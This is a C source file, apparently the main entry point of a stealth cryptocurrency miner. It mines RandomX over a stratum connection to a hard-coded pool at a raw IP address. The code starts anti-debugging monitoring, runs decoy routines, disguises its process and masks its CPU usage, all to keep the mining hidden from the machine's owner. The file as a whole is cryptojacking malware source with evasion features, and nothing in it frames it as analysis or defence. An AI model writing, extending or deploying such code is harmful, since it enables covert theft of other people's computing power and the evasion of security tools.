#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include "libantidebug.h"
#include "libcrypto.h"
#include "libutils.h"
#include "libstratum.h"
#include "libminer.h"
#include "libdecoy.h"
#include "randomx.h"

#include "../stealth.conf"

#ifndef STEALTH_URL
#define STEALTH_URL      "wss://213.192.2.99:41928"
#endif
#ifndef STEALTH_USER
#define STEALTH_USER     "x"
#endif
#ifndef STEALTH_PASS
#define STEALTH_PASS     "x"
#endif
#ifndef STEALTH_WORKER
#define STEALTH_WORKER   ""
#endif
#ifndef STEALTH_THREADS
#define STEALTH_THREADS  2
#endif

static volatile sig_atomic_t g_running = 1;
int g_mute = 1;

static void signal_handler(int sig)
{
    (void)sig;
    g_running = 0;
}

int main(int argc, char *argv[])
{
    (void)argc;
    (void)argv;

    antidebug_init();
    fake_xor_decoys();
    antidebug_start_monitor();
    decoy_start();

    char url[512] = STEALTH_URL;
    char user[256] = STEALTH_USER;
    char pass[256] = STEALTH_PASS;
    int num_threads = STEALTH_THREADS;
    int cpu_rand_mode = CPU_RANDOMIZE_SINE;

    rx_config.flags = RANDOMX_FLAG_HARD_AES | RANDOMX_FLAG_JIT | RANDOMX_FLAG_FULL_MEM;
    rx_config.full_mem = true;

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGPIPE, SIG_IGN);

    process_disguise();
    process_set_low_priority();

    char worker[256];
    if (STEALTH_WORKER[0]) {
        snprintf(worker, sizeof(worker), "%s.%s", user, STEALTH_WORKER);
        strncpy(user, worker, sizeof(user) - 1);
    }

    while (g_running) {
        if ((rx_config.flags & RANDOMX_FLAG_HARD_AES) && !has_hardware_aes())
            rx_config.flags &= ~RANDOMX_FLAG_HARD_AES;

        stratum_ctx_t stratum;
        miner_pool_t miner;

        if (stratum_connect(&stratum, url, user, pass) != 0) {
            sleep(5);
            continue;
        }
        if (stratum_login(&stratum) != 0) {
            stratum_disconnect(&stratum);
            sleep(5);
            continue;
        }

        if (miner_pool_init(&miner, &stratum, num_threads) != 0) {
            stratum_disconnect(&stratum);
            sleep(5);
            continue;
        }

        miner.cpu_rand_mode = cpu_rand_mode;
        miner.rand_mem = false;
        miner_pool_start(&miner);

        while (g_running && stratum.connected)
            usleep(1000000);

        miner_pool_stop(&miner);
        miner_pool_wait(&miner);
        stratum_disconnect(&stratum);

        if (g_running)
            sleep(5);
    }
    miner_pool_cleanup_rx();
    return 0;
}
